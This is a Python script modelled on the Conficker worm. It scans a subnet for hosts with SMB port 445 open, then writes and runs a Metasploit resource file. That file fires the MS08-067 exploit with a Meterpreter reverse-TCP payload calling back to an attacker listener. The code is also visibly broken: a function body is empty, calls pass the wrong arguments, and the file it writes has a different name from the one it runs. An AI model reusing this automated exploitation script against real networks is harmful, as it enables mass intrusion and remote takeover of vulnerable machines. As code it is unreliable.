# coding=utf-8
import os
import optparse
import sys
import nmap
# Conficker蠕虫的主要逻辑

def findTgts(subNet):
    # 查找网段内开放445端口的主机
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile,lhost,lport):
    # 安装handler监听器
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile,tgtHost,lhost,lport):
    # 设置漏洞利用模块和payload
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST '+str(tgtHost))+'\n'
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('exploit -j -z\n')



def smbBrute(config):
    # 爆破SMB 用户名/密码



def main():
    # 设置命令行参数
    configfile = open('meta.rc', 'w')
    parser = optparse.OptionParser("[-] usage%prog -h <RHOST[s]> -l <LHOST> [-p <LPORT> -f <Password File>]")
    parser.add_option('-h', dst='rhost', type='string', help='specify the target address')
    parser.add_option('-l', dst='lhost', type='string', help='specify the listen address')
    parser.add_option('-p', dst='lport', type='string', help='specify the listen port')
    parser.add_option('-f', dst='passwdFile', type='string', help='password file for SMB brute force attempt')
    (options, args) = parser.parse_args()
    if (options.rhost == None) | (options.lhost == None):
        print parser.usage
        exit(0)
    # targethost = options.rhost
    listenhost = options.lhost
    listenport = options.lport
    if (options.lport == None):
        listenport = '1337'
    passwdfile = options.passwdFile
    # 查找有效目标
    tgtFind = findTgts(options.rhost)
    setupHandler(configfile,listenhost,listenport)

    for target in tgtFind:
        confickerExploit()
        if passwdfile!= None:
            smbBrute(configfile,target,passwdfile,listenhost,listenport)
    configfile.close()
    os.system('msfconsole -r meta.ra')

if __name__ == '__main__':
    main()
